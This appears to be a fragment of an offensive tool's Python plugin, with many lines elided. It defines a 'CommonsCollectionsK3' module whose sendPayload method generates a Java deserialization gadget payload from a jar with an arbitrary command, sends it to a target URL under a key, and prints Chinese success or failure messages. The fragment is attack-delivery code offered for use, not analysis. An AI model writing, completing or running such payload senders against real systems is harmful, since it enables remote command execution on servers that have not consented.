...
@Idea.plugin_register('Class32:CommonsCollectionsK3')
class CommonsCollectionsK3(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollectionsK3', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****CommonsCollectionsK3模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****CommonsCollectionsK3模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
